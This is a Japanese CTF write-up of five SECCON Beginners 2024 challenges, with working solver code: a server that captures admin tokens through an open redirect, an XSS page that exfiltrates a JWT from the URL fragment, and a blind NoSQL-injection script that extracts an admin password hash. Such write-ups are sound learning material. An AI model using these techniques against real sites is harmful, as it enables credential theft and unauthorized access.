---
title: SECCON Beginners CTF 2024 Writeup
date: 2024-07-01
layout: writeup
rank: 45
total_teams: 962
language: ja
tags:
  - Web
  - Misc
---

# はじめに

去年はctf4bに参加したことで危うく微分方程式を落単しかけましたが、今年はこの時期に試験が無かったので意気揚々とctf4bに参加してきました。
大学のサークルでチームKIT3re2として参加し、962チーム中45位でした。
![](/assets/img/seccon_beginners_ctf_2024/11fc6e9a49b0-20240701.png)

# WriteUp

チームメンバーがRevとPwnつよつよだったので私はずっとWebを解いていました。
最終的に私が解けた問題は

- Welcome
- Wooorker (web/beginner)
- Wooorker2 (web/medium)
- double-leaks (web/medium)
- getRank (misc/easy)

の5問になります。

## Welcome

Discordサーバーのannouncementsチャンネルを確認。
Flagは`ctf4b{Welcome_to_SECCON_Beginners_CTF_2024}`でした。

## Wooorker

ログインページがあり、ゲストユーザーのユーザー名とパスワードを入力すると「Access denied」と表示されます。そしてページのURLにはトークンがクエリパラメータで付与されていました。

:::details 問題ソースコード

```js:app/server.js
const express = require('express');
const jwt = require('jsonwebtoken');
const path = require('path');
const crypto = require('crypto');

const app = express();
app.use(express.json());
app.use(express.static('public'));

const jwtSecret = crypto.randomBytes(64).toString('hex');
const FLAG = process.env.FLAG;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD;

const users = {
  admin: { password: ADMIN_PASSWORD, isAdmin: true },
  guest: { password: 'guest', isAdmin: false }
};

app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = users[username];

  if (user && user.password === password) {
    const token = jwt.sign({ username, isAdmin: user.isAdmin }, jwtSecret, { expiresIn: '1h' });
    res.status(200).json({ token });
  } else {
    res.status(401).json({ error: 'Unauthorized' });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'flag.html'));
});

app.get('/flag', (req, res) => {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  try {
    const decoded = jwt.verify(token, jwtSecret);
    if (decoded.isAdmin) {
      const flag = FLAG;
      res.status(200).json({ flag });
    } else {
      res.status(403).json({ error: 'Access denied' });
    }
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
});

// レポート機能
// Redis
const Redis = require("ioredis");
let redisClient = new Redis({
  host: process.env.REDIS_HOST,
  port: process.env.REDIS_PORT,
});
redisClient.set("queued_count", 0);
redisClient.set("proceeded_count", 0);

app.get("/report", async (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'report.html'));
});

app.post("/report", async (req, res, next) => {
  // Parameter check
  const { path } = req.body;
  if (!path || path === "") {
    res.status(400).json({ error: 'Invalid request' });
  }
  try {
    // Enqueued jobs are processed by crawl.js
    redisClient
      .rpush("query", path)
      .then(() => {
        redisClient.incr("queued_count");
      })
      .then(() => {
        console.log("Report enqueued :", path);
        res.status(200).json({ message: 'OK. Admin will check the URL you sent.' });
      });
  } catch (e) {
    console.log("Report error :", e);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

const PORT = process.env.PORT || 34466;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
```

```js:clawler/index.js
const { chromium } = require('playwright');
const { v4: uuidv4 } = require("uuid");
const Redis = require("ioredis");
const connection = new Redis({
  host: process.env.REDIS_HOST,
  port: process.env.REDIS_PORT,
});

const ADMIN_USERNAME = process.env.ADMIN_USERNAME; 
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD; 
const APP_URL = process.env.APP_URL;

const crawl = async (path, ID) => {
  const browser = await chromium.launch();
  const page = await browser.newPage();
  try {
    // (If you set `login?next=/` as path in Report page, admin accesses `https://wooorker2.quals.beginners.seccon.jp/login?next=/` here.)
    const targetURL = APP_URL + path;
    console.log("target url:", targetURL);
    await page.goto(targetURL, {
        waitUntil: "domcontentloaded",
        timeout: 3000, 
    }); 
    await page.waitForSelector("input[id=username]");
    await page.type("input[id=username]", ADMIN_USERNAME);
    await page.type("input[id=password]", ADMIN_PASSWORD);
    await page.click("button[type=submit]");

    await page.waitForTimeout(1000);

    await page.close();
  } catch (err) {
    console.error("crawl", ID, err.message);
  } finally {
    await browser.close();
    console.log("crawl", ID, "browser closed");
  }
};

(async () => {
  while (true) {
    console.log(
      "[*] waiting new query",
      await connection.get("queued_count"),
      await connection.get("proceeded_count")
    );
    const ID = uuidv4();
    await connection
      .blpop("query", 0)
      .then((v) => {
        const path = v[1];
        console.log("crawl", ID, path);
        return crawl(path, ID);
      })
      .then(() => {
        console.log("crawl", ID, "finished");
        return connection.incr("proceeded_count");
      })
      .catch((e) => {
        console.log("crawl", ID, e);
      });
  }
})();
```

:::

ソースコードを見てみるとjwt認証が施されており、`isAdmin`がtrueになっているトークンをなんらかの手法で取得できればFlagが得られることが分かります。
ここで`package.json`を確認しますが、`jsonwebtoken`のバージョンは`^9.0.2`なので`alg=none`攻撃は使用できなさそうです。

また、クローラーはadminのパスワードを所持しており、`/report`の報告ページに任意のパスを入力すればそのページにadminとしてログインを試みてくれるようです。
ここでログイン画面のスクリプトを読んでみると、ログイン後は`next`のクエリで指定されたパスに遷移することが分かります。

```js:app/public/main.js
const loginWorker = new Worker('login.js');

function login() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
    loginWorker.postMessage({ username, password });
}

loginWorker.onmessage = function(event) {
    const { token, error } = event.data;
    if (error) {
        document.getElementById('errorContainer').innerText = error;
        return;
    }
    if (token) {
        const params = new URLSearchParams(window.location.search);
        const next = params.get('next');

        if (next) {
            window.location.href = next.includes('token=') ? next: `${next}?token=${token}`;
        } else {
            window.location.href = `/?token=${token}`;
        }
    }
};
```

ここでは`next`にバリデーション等が施されていないので、外部サイトへ遷移させることが可能です。
ということで、自分のサーバーにクローラーを遷移させてトークンを取得する方針を立てました。

クエリパラメータに含まれるトークンを取得し、ログに表示するサーバーを用意します。

```js:solver/server.js
const http = require('http');
const url = require('url');

const server = http.createServer((req, res) => {
  const queryObject = url.parse(req.url, true).query;
  console.log('token:', queryObject.token);
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(queryObject));
});

const PORT = 43000;
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
```

このサーバーに遷移させるよう、`/report`に`login?next=https://{用意したサーバー}/`と入力してクローラーに巡回してもらいます。するとadminユーザーのトークンが取得できるので、そのトークンを使用して`https://wooorker.beginners.seccon.games/?token={取得したトークン}`にアクセスするとFlagが表示されました。

Flagは`ctf4b{0p3n_r3d1r3c7_m4k35_70k3n_l34k3d}`でした。

## Wooorker2

Wooorkerとほぼ同じ問題ですが、ログイン画面のスクリプトに変更が施されており、トークンはクエリパラメータではなくフラグメントに格納されているようです。

```js:app/public/main.js
const loginWorker = new Worker('login.js');

function login() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
    loginWorker.postMessage({ username, password });
}

loginWorker.onmessage = function(event) {
    const { token, error } = event.data;
    if (error) {
        document.getElementById('errorContainer').innerText = error;
        return;
    }
    if (token) {
        const params = new URLSearchParams(window.location.search);
        const next = params.get('next');

        if (next) {
            window.location.href = next.includes('token=') ? next: `${next}#token=${token}`;
        } else {
            window.location.href = `/#token=${token}`;
        }
    }
};
```

フラグメント内の情報をサーバー側で取得することは難しいため、Wooorkerの解法は使えません。しかし、遷移先は相変わらず外部サイトも含めて`next`パラメータで自由に指定できるため、XSSによってフラグメント内のトークンをクライアント側で取得することは可能です。

ということで、トークンを取得するサーバーを用意します。
取得したトークンをクライアント側で表示せずに一旦サーバー側に送信してサーバー側でログに出力するという無駄なことをやっていますが、この問題を解いたのが午前3時とかだったので頭が回ってなかったんだと思います。

```js:solver/server.js
const express = require('express');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get('/', (req, res) => {
    res.sendFile('./public/index.html', { root: __dirname });
});

app.get('/token', (req, res) => {
    const token = req.query.token;
    console.log('token:', token);
    res.json({ token });
});

const port = 43000;
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
```

```html:solver/public/index.html
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>Token表示</title>
</head>
<body>
    <div id="token"></div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            var currentUrl = window.location.href;
            var fragment = currentUrl.split('#')[1].split('=')[1];
            if (fragment) {
                document.getElementById('token').innerText = fragment;
                fetch('/token?token=' + fragment)
                    .catch(error => {
                        console.error('Error:', error);
                    });
            }
        });
    </script>
</body>
</html>
```

あとはこのサーバーを立て、Wooorkerと同じように`/report`に`login?next=https://{用意したサーバー}/`と入力してクローラーに巡回してもらい、取得できたトークンを使用して`https://wooorker2.beginners.seccon.games/?token={取得したトークン}`にアクセスするとFlagが表示されました。

Flagは`ctf4b{x55_50m371m35_m4k35_w0rk3r_vuln3r4bl3}`でした。

## double-leaks

これまたどうにかしてadminでログインしようという問題。ゲストユーザーも用意されていないようなのでとりあえずソースコードを読みます。

:::details 問題ソースコード

```py:app/app.py
from flask import Flask, request, jsonify, render_template, abort
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from pymongo import MongoClient
import hashlib
import os
import sys
import string
import traceback

app = Flask(__name__)
limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["10 per second"],
)


def get_mongo_client():
    client = MongoClient(host="mongodb", port=27017)
    out = client.db_name.command("ping")
    assert "ok" in out, "MongoDB is not ready"
    return client


# insert init data
try:
    client = get_mongo_client()
    db = client.get_database("double-leaks")
    users_collection = db.get_collection("users")

    admin_username = os.getenv("ADMIN_USERNAME", "")
    assert len(admin_username) > 0 and any(
        [ch in string.printable for ch in admin_username]
    ), "ADMIN_USERNAME is not set"
    admin_password = os.getenv("ADMIN_PASSWORD", "")
    assert len(admin_password) > 0 and any(
        [ch in string.printable for ch in admin_password]
    ), "ADMIN_PASSWORD is not set"
    flag = os.getenv("FLAG", "flag{dummy_flag}")
    assert len(flag) > 0 and any(
        [ch in string.printable for ch in flag]
    ), "FLAG is not set"

    if users_collection.count_documents({}) == 0:
        hashed_password = hashlib.sha256(admin_password.encode("utf-8")).hexdigest()
        users_collection.insert_one(
            {"username": admin_username, "password_hash": hashed_password}
        )
except Exception:
    traceback.print_exc(file=sys.stderr)
finally:
    client.close()


def waf(input_str):
    # DO NOT SEND STRANGE INPUTS! :rage:
    blacklist = [
        "/",
        ".",
        "*",
        "=",
        "+",
        "-",
        "?",
        ";",
        "&",
        "\\",
        "=",
        " ^",
        "(",
        ")",
        "[",
        "]",
        "in",
        "where",
        "regex",
    ]
    return any([word in str(input_str) for word in blacklist])


@app.route("/<path:path>")
def missing_handler(path):
    abort(404, "page not found :(")


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/login", methods=["POST"])
def login():
    username = request.json["username"]
    password_hash = request.json["password_hash"]
    if waf(password_hash):
        return jsonify({"message": "DO NOT USE STRANGE WORDS :rage:"}), 400

    try:
        client = get_mongo_client()
        db = client.get_database("double-leaks")
        users_collection = db.get_collection("users")
        user = users_collection.find_one(
            {"username": username, "password_hash": password_hash}
        )
        if user is None:
            return jsonify({"message": "Invalid Credential"}), 401

        # Confirm if credentials are valid just in case :smirk:
        if user["username"] != username or user["password_hash"] != password_hash:
            return jsonify({"message": "DO NOT CHEATING"}), 401

        return jsonify(
            {"message": f"Login successful! Congrats! Here is the flag: {flag}"}
        )

    except Exception:
        traceback.print_exc(file=sys.stderr)
        return jsonify({"message": "Internal Server Error"}), 500
    finally:
        client.close()


if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=41413)
```

:::

この問題ではmongoDBが使用されており、NoSQLでユーザー情報の管理を行っているようです。
また、やはりユーザーはadminのみしか登録されておらず、それ以外のユーザーは存在しないようです。

この問題で重要なところはこの部分になります。

```py
        user = users_collection.find_one(
            {"username": username, "password_hash": password_hash}
        )
        if user is None:
            return jsonify({"message": "Invalid Credential"}), 401

        # Confirm if credentials are valid just in case :smirk:
        if user["username"] != username or user["password_hash"] != password_hash:
            return jsonify({"message": "DO NOT CHEATING"}), 401

        return jsonify(
            {"message": f"Login successful! Congrats! Here is the flag: {flag}"}
        )
```

ここで、NoSQLには入力に値だけではなく演算子を用いたオブジェクトを挿入することが可能です。例えば以下のように不一致を表す`$ne`演算子を用いて以下のようなNoSQLクエリを実行すると、usernameとpassword_hashのいずれかが空文字列ではない（事実上全ての）ユーザーが取得できます。

```
{
      "username": {"$ne": ""},
      "password_hash": {"$ne": ""}
}
```

また、ユーザーのサーチにはリクエストで受け取った`username`と`password_hash`をそのまま挿入しているようです。
Pythonは動的型付け言語なので、Bodyにオブジェクトを含むリクエストを受け取るとそのまま`username`と`password_hash`に挿入してNoSQLクエリを実行できそうです。つまり、NoSQL Injectionが可能です。

さて、ここでユーザーが存在しない場合は`Invalid Credential`のエラーを、何らかの方法でusernameやpassword_hashが間違っていたのに合致したユーザーが返ってきた場合は`DO NOT CHEATING`のエラーを返していることが分かります。

ここまでの情報から、Boolean-Based Blind SQL Injectionっぽいことができそうなので、一文字ずつ特定していくことでusernameとpassword_hashを特定できそうです。

NoSQLには`$regex`という正規表現演算子があるのでこれが使えれば前方一致や後方一致が楽に実装できるのでソルバの実装が簡単なのですが、`regex`の文字列や正規表現で使いそうな記号たちはpassword_hashに含められないようです。
そのため、比較演算子`$gte`を使用します。この演算子は数値の他、文字列も辞書順で比較してくれます。

あとはsolverを書くだけです。ユーザー名に関する情報が無かったので、一旦小文字英数字だろうと勝手にあたりをつけて実装したら通りました。パスワードはハッシュ化されているため、`0-9a-f`の16種類の文字からなることが分かります。

```js:solver.js
const charset = "0123456789abcdefghijklmnopqrstuvwxyz";
const hexset = "0123456789abcdef";
const url = "https://double-leaks.beginners.seccon.games/login";

async function try_login(username, password_hash) {
  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      "username": {"$gte": username},
      "password_hash": {"$gte": password_hash}
    })
  });
  const data = await response.json();
  if (data.message == "DO NOT CHEATING") {
    return true;
  } else if (data.message == "Invalid Credential") {
    return false;
  } else {
    throw new Error(data.message);
  }
}

async function verify_username(username) {
  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      "username": username,
      "password_hash": {"$gte": ""}
    })
  });
  const data = await response.json();
  if (data.message == "DO NOT CHEATING") {
    return true;
  } else if (data.message == "Invalid Credential") {
    return false;
  } else {
    throw new Error(data.message);
  }
}

async function verify_password_hash(password_hash) {
  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      "username": {"$gte": ""},
      "password_hash": password_hash
    })
  });
  const data = await response.json();
  if (data.message == "DO NOT CHEATING") {
    return true;
  } else if (data.message == "Invalid Credential") {
    return false;
  } else {
    throw new Error(data.message);
  }
}

async function username_brute_force() {
  let username = "";
  while (true) {
    let saved_username = username;
    for (let i = 0; i < charset.length; i++) {
      await new Promise(resolve => setTimeout(resolve, 50));
      const new_username = username + charset[i];
      const result = await try_login(new_username, "");
      console.log("Trying:", new_username);
      if (result) {
        saved_username = new_username;
        if (i == charset.length - 1) {
          username = saved_username;
          break;
        }
        continue;
      } else {
        username = saved_username;
        break;
      }
    }
    const verified = await verify_username(username);
    if (verified) {
      return username;
    }
  }
}

async function password_hash_brute_force() {
  let password_hash = "";
  while (true) {
    let saved_password_hash = password_hash;
    for (let i = 0; i < hexset.length; i++) {
      await new Promise(resolve => setTimeout(resolve, 50));
      const new_password_hash = password_hash + hexset[i];
      const result = await try_login("", new_password_hash);
      console.log("Trying:", new_password_hash);
      if (result) {
        saved_password_hash = new_password_hash;
        if (i === hexset.length - 1) {
          password_hash = saved_password_hash;
          break;
        }
        continue;
      } else {
        password_hash = saved_password_hash;
        break;
      }
    }
    const verified = await verify_password_hash(password_hash);
    if (verified) {
      return password_hash;
    }
  }
}

async function solve() {
  const username = await username_brute_force();
  console.log("Username:", username);
  const password_hash = await password_hash_brute_force();
  console.log("Password Hash:", password_hash)

  const response = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      "username": username,
      "password_hash": password_hash
    })
  });
  const data = await response.json();
  console.log(data.message);
}

solve();
```

Flagは`ctf4b{wh4t_k1nd_0f_me4l5_d0_y0u_pr3f3r?}`でした。

## getRank

思い浮かべてる数字を当ててね！というゲームで数字を当てると得点が1増加し、順位が表示される問題。おそらく1位になるとFlagが得られるものだとあたりをつけ、ソースコードを確認します。

:::details 問題ソースコード

```js:app/main.ts
import fastify, { FastifyRequest } from "fastify";
import fs from "fs";

const RANKING = [10 ** 255, 1000, 100, 10, 1, 0];

type Res = {
  rank: number;
  message: string;
};

function ranking(score: number): Res {
  const getRank = (score: number) => {
    const rank = RANKING.findIndex((r) => score > r);
    return rank === -1 ? RANKING.length + 1 : rank + 1;
  };

  const rank = getRank(score);
  if (rank === 1) {
    return {
      rank,
      message: process.env.FLAG || "fake{fake_flag}",
    };
  } else {
    return {
      rank,
      message: `You got rank ${rank}!`,
    };
  }
}

function chall(input: string): Res {
  if (input.length > 300) {
    return {
      rank: -1,
      message: "Input too long",
    };
  }

  let score = parseInt(input);
  if (isNaN(score)) {
    return {
      rank: -1,
      message: "Invalid score",
    };
  }
  if (score > 10 ** 255) {
    // hmm...your score is too big?
    // you need a handicap!
    for (let i = 0; i < 100; i++) {
      score = Math.floor(score / 10);
    }
  }

  return ranking(score);
}

const server = fastify();

server.get("/", (_, res) => {
  res.type("text/html").send(fs.readFileSync("public/index.html"));
});

server.post(
  "/",
  async (req: FastifyRequest<{ Body: { input: string } }>, res) => {
    const { input } = req.body;
    const result = chall(input);
    res.type("application/json").send(result);
  }
);

server.listen(
  { host: "0.0.0.0", port: Number(process.env.PORT ?? 3000) },
  (err, address) => {
    if (err) {
      console.error(err);
      process.exit(1);
    }
    console.log(`Server listening at ${address}`);
  }
);
```

:::

どうやら10^255ポイント以上でランキングが1位となり、Flagが得られるという問題のようです。
当然手作業で10^255ポイントを取得するのは非現実的なので、APIに良い感じの値を入力して直接叩く方針になります。

鍵になるのはchallの部分で、なぜか文字列で渡されたポイントをint型に変換し、さらに10^255より大きければ10^100で割るという処理を行っています。

```js
function chall(input: string): Res {
  if (input.length > 300) {
    return {
      rank: -1,
      message: "Input too long",
    };
  }

  let score = parseInt(input);
  if (isNaN(score)) {
    return {
      rank: -1,
      message: "Invalid score",
    };
  }
  if (score > 10 ** 255) {
    // hmm...your score is too big?
    // you need a handicap!
    for (let i = 0; i < 100; i++) {
      score = Math.floor(score / 10);
    }
  }

  return ranking(score);
}
```

ということで、10^355よりも大きな値を300字以内で送ってあげればランキング1位に割り込めそうです。
最初に思いついたのは`Infinity`や`1e1000`などの指数表記ですが、`parseInt()`関数で数値型に変換することはできないようです。`parseFloat()`ならできるんだけどな……

ここで`parseInt()`のドキュメントを読むと、どうやら`0xffff`などの16進数表記なら受け入れてくれるということが分かりました。`0xfff.......ffff`のような値なら10^355より大きくなりそうなので、APIを直接叩くsolverを書きます。

```js:solver.js
async function solver() {
  const response = await fetch('https://getrank.beginners.seccon.games/', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      'input': '0x'+'f'.repeat(297),
    }),
  });
  const data = await response.json();
  console.log(data.message)
}

solver();
```

Flagは`ctf4b{15_my_5c0r3_700000_b1g?}`でした。

# おわりに

![](/assets/img/seccon_beginners_ctf_2024/745b8051c4c9-20240701.png)
実はCTFに参加するのが昨年のCakeCTF以来だったのですが、CTF力もそれなりに上がっていて安堵しました。
今年はmedium問もそれなりに解けたので嬉しかった一方、easy問のssrforlfiが解けなかったのが悔しかったですね。私の知識が広く浅くというか、情報収集能力が足りないというか。ちゃんと調べれば解けた問題だったと思うので惜しいことをしたなと思っています。
最近Cryptoの勉強を始めたので、次に出るCTFではCryptoも少しは解ければなと思っています。それでは。
